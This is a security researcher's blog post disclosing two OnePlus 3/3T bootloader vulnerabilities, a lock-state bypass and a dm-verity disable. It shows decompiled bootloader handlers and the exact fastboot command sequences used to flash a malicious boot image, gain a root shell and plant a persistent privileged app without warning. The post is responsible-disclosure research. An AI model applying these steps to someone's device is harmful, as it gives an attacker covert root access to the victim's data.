---
layout: post
title: 'Owning a Locked OnePlus 3/3T: Bootloader Vulnerabilities'
author: Roee Hay
date: '2017-02-08'
tags: OnePlus3 OnePlus3T Vulnerability Bootloader 4F500301 4F500302 dm-verity disable_dm_verity Unlock Bypass 
description: '2 vulnerabilities in OnePlus 3/3T bootloader. CVE-2017-5626: Bypassing its lock state (fastboot oem 4F500301). CVE-2017-5624: Disabling dm-verity (fastboot oem disable_dm_verity).'
---

In this blog post I disclose two vulnerabilities in the OnePlus 3/3T bootloader. The first one, [CVE-2017-5626], is a critical severity vulnerability affecting OxygenOS 3.2-4.0.1 (4.0.2 is patched). The vulnerability allows for a physical adversary (or one with ADB/fastboot access) to bypass the bootloader's lock state, even when `Allow OEM Unlocking` is disabled, without user confirmation and without triggering a factory reset. This vulnerability allows for kernel code execution (albeit with a [5 seconds warning](#exploiting-cve-2017-5626-for-kernel-code-execution) upon boot). The second vulnerability, [CVE-2017-5624], affecting all versions of OxygenOS to date, allows the attacker to disable `dm-verity`. The combination of the vulnerabilities enables a powerful attack -- persistent highly privileged code execution without any warning to the user and with access to the original user's data (after the victim enters his credentials).


Both issues were responsibly disclosed to and acknowledged by *OnePlus Security*. The first vulnerability, [CVE-2017-5626], was reported on **January 23rd**. It was also found independently by a OnePlus engineer. [CVE-2017-5624], reported on **January 16th**, should be fixed in a future OxygenOS release -- the reason for its today's public disclosure is because someone already [published](https://forum.xda-developers.com/oneplus-3/how-to/fix-easy-method-removing-dm-verity-t3544339) it on **January 24th**.

*Disclaimer*: I tested the vulnerabilities on OnePlus 3 only, but OnePlus 3T contains the vulnerable code too.

### Bypassing the Bootloader's Lock (CVE-2017-5626) ###
OnePlus 3 & 3T running OxygenOS 3.2 - 4.0.1 had two proprietary fastboot `oem` commands:

1. `fastboot oem 4F500301` -- bypasses the bootloader's lock -- allowing one with fastboot access to effectively unlock the device, disregarding `OEM Unlocking`, without user confirmation and without erasure of userdata (which normally occurs after lock-state changes). Moreover, the device still reports it's locked after running this command.

2. `fastboot oem 4F500302` -- resets various bootloader settings. For example, it will lock an unlocked bootloader without user confirmation.

Analyzing the bootloader binary shows that the routine which handles the `4F500301` command is pretty straightforward: 

```c
// 'oem 4F500301' handler
int sub_918427F0()
{
  magicFlag_dword_91989C10 = 1;
  if ( dword_9198D804 != dword_9198D804 )
    assert(1, dword_9198D804, dword_9198D804);
  return sendOK((int)"", dword_9198D804);
}
```

Thus it sets some global flag located at `91989C10` (which we named `magicFlag`). By looking at the procedures which handle the format/erase fastboot commands, we can clearly see `magicFlag` overrides the lock state of the device in several checks -- when flashing or erasing a partition:

```c
// 'flash' handler
const char *__fastcall sub_91847EEC(char *partitionName, int *a2, int a3)
{
  char *pname; // r5@1
...
  pname = partitionName;
  v4 = a2;
  v5 = a3;
  if ( returnTRUE1(partitionName, (int)a2) )
  {
    result = (const char *)sub_918428F0(pname, v6);
    if ( (result || magicFlag_dword_91989C10)
      && ((result = (const char *)sub_91842880(pname, v10)) != 0 || magicFlag_dword_91989C10) )
    {
      result = (const char *)sub_918428F0(pname, v10);
      if ( !result || magicFlag_dword_91989C10 )
        goto LABEL_7;
      v8 = dword_9198D804;
      if ( dword_9198D804 != dword_9198D804 )
        goto LABEL_28;
      v11 = "Critical partition flashing is not allowed";
    }
    else
    {
      v8 = dword_9198D804;
      if ( dword_9198D804 != dword_9198D804 )
        goto LABEL_28;
      v11 = "Partition flashing is not allowed";
    }
    return (const char *)FAIL2((int)v11, v10);
  }
LABEL_7:
  ...
    if ( *v4 != 0xED26FF3A )
    {
      if ( *v4 == 0xCE1AD63C )
        cmd_flash_meta_img(pname, (unsigned int)v4, v5);
      else
        cmd_flash_mmc_img(pname, (int)v4, v5);
      goto LABEL_10;
    }
    v7 = v4;
  }
  cmd_flash_mmc_sparse_img(pname, (int)v7, v5);
  ...
 }
```
```c
// 'erase' handler
int __fastcall sub_91847118(char *partitionName, int a2, int a3)
{
 ...
  v3 = partitionName;
  v4 = returnTRUE1(partitionName, a2);
  if ( !v4 )
  {
LABEL_7:
    ...
    if ( v4 )
    {
      if ( dword_9198D804 == dword_9198D804 )
        return eraseParition(v3);
    }
    ...
  }
  v4 = sub_918428F0(v3, v5);
  if ( !v4 && !magicFlag_dword_91989C10 )
  {
    v6 = dword_9198D804;
    if ( dword_9198D804 == dword_9198D804 )
    {
      v7 = "Partition erase is not allowed";
      return FAIL2((int)v7, v5);
    }
    goto LABEL_23;
  }
  v4 = sub_91842880(v3, v5);
  if ( !v4 && !magicFlag_dword_91989C10 )
  {
    v6 = dword_9198D804;
    if ( dword_9198D804 == dword_9198D804 )
    {
      v7 = "Partition flashing is not allowed";
      return FAIL2((int)v7, v5);
    }
LABEL_23:
    assert(v4, v5, v6);
  }
  v4 = sub_918428F0(v3, v5);
  if ( !v4 || magicFlag_dword_91989C10 )
    goto LABEL_7;
  v6 = dword_9198D804;
  ...
  v7 = "Critical partition erase is not allowed";
  return FAIL2((int)v7, v5);
}
```

### Exploiting CVE-2017-5626 for Kernel Code Execution ###
By exploiting this vulnerability, the attacker, for example, can flash a malicious boot image (which contains both the kernel & the root ramfs), in order to practically own the platform. 
The problem, however, is that the bootloader and platform detect such modifications, a feature known as [Verified Boot](https://source.android.com/security/verifiedboot/). The `boot` and `recovery` partitions are verified by the bootloader -- flashing a modified `boot` partition, for instance, will prompt the following warning upon boot:

![Verified Boot warning](/images/opo3-red-bootstate.jpg).


Another option which will not trigger this warning is flashing an old non-modified boot image -- older images contain known security vulnerabilities which can be exploited by the attacker.

Anyway, despite the warning (which automatically disappears after 5 seconds!) OnePlus 3/3T still allows to boot in the red [verifiedboot state](https://source.android.com/security/verifiedboot/verified-boot.html#boot_state), hence the attacker's code executes. 

There is an uncountable number of ways for demonstrating the severity of this, so I chose the easiest one.

By modifying the boot image:

1. I've set SELinux to `permissive` mode by appending `androidboot.selinux=permissive` to the kernel command line.

2. I've modified the `ramfs` s.t. `ro.debuggable=1`, `ro.secure=0`, `ro.adb.secure=0`, and changed the USB config property (`sys.usb.config`) to include `adb` upon boot.

I then exploited the vulnerability, flashing the modified `boot.img` (`evil_boot.img`):

```c
λ fastboot flash boot evil_boot.img
target reported max download size of 440401920 bytes
sending 'boot' (14836 KB)...
OKAY [  0.335s]
writing 'boot'...
FAILED (remote: Partition flashing is not allowed)
finished. total time: 0.358s

λ  fastboot oem 4F500301
...
OKAY [  0.020s]
finished. total time: 0.021s

λ fastboot flash boot  evil_boot.img
target reported max download size of 440401920 bytes
sending 'boot' (14836 KB)...
OKAY [  0.342s]
writing 'boot'...
OKAY [  0.135s]
finished. total time: 0.480s
```

That had given me a root shell, even before the user entered his credentials:

```c
OnePlus3:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),
1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),
3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0

OnePlus3:/ # getenforce
Permissive
```

The OnePlus 3/3T kernel seems to be compiled with LKM enabled, so running kernel code does not even require patching / recompiling the kernel.

So I created a tiny kernel module:

```c
#include <linux/module.h>
#include <linux/kdb.h>
int init_module(void)
{
    printk(KERN_ALERT "Hello From Kernel\n");
    return 1;
}
```

And then loaded it into the kernel:

```c
OnePlus3:/data/local/tmp # insmod ./test.ko
OnePlus3:/data/local/tmp # dmesg | grep Hello
[19700121_21:09:58.970409]@3 Hello From Kernel
```

### Disabling dm-verity (CVE-2017-5624) ###

The verification of the `system` partition, as opposed to `boot` & `recovery`, is driven by `dm-verity`. What we discovered, is that one can instruct the locked bootloader to bring up the platform with `dm-verity` disabled by another fastboot command: `fastboot oem disable_dm_verity`. 

The `oem disable_dm_verity` handler is as follows:

```c
// 'oem disable_dm_verity' handler
int sub_9183B8EC()
{
  int v0; // r0@1
  int v1; // r1@1

  dmVerity_dword_91960740 = 0;
  v0 = sub_91845E10("ANDROID-BOOT!");
  if ( dword_9198D804 != dword_9198D804 )
    assert(v0, v1, dword_9198D804);
  return sendOK((int)"", v1);
}
```

So again, this sets some flag at `91960740` (which we named dmVerity). It is then used by the bootloader when it constructs the kernel cmdline: 

![DM-Verity command line build-up](/images/opo3_aboot-dm_verity_disable.png)

The `androidboot.enable_dm_verity` kernel command line argument propagates to the `ro.boot.enable_dm_verity` which later instructs OnePlus's `init` whether or not to disable `dm-verity`:

![DM-Verity command line build-up](/images/opo3_init-dm_verity_disable.png)

### Combining the 2 Vulnerabilities ###

The couple of vulnerabilities can be combined together for code execution with privileged SELinux domains, without any warning to the user and with access to the original user data. In order to demonstrate this (and there are probably thousands of better ways with a higher severity), I've modified the system partition, adding a privileged app. This can be done by placing an APK under `/system/priv-app/<APK_DIR>` which will eventually cause it to be added to the [priv_app domain](https://android.googlesource.com/platform/system/sepolicy/+/android-7.1.1_r16/priv_app.te).

```c
λ fastboot flash system system-modded.simg
target reported max download size of 440401920 bytes
erasing 'system'...
FAILED (remote: Partition erase is not allowed)
finished. total time: 0.014s

λ fastboot oem 4F500301
OKAY
[  0.020s] finished. total time: 0.021s

λ fastboot flash system system-modded.simg
target reported max download size of 440401920 bytes erasing 'system'...
OKAY [  0.010s]
...
sending sparse 'system' 7/7 (268486 KB)...
OKAY [  6.748s]
writing 'system' 7/7...
OKAY [  3.291s]
finished. total time: 122.675s

λ fastboot oem disable_dm_verity
...
OKAY

[  0.034s] finished. total time: 0.036s
```

Indeed the app loads with the `priv_app` context:

```c
1|OnePlus3:/ $ getprop | grep dm_verity
[ro.boot.enable_dm_verity]: [0]
OnePlus3:/ $ ps -Z | grep roeeh
u:r:priv_app:s0:c512,c768      u0_a16    4764  2200  1716004 74600 SyS_epoll_ 0000000000 S roeeh.fooapp
```

The following video shows the result -- platform has been loaded without a warning and with the privileged app is installed.
<iframe width="560" height="315" src="https://www.youtube.com/embed/x5FG4Sb5kog" frameborder="0" allowfullscreen></iframe>


[CVE-2017-5624]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5624 "CVE-2017-5624"
[CVE-2017-5626]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5626 "CVE-2017-5626"

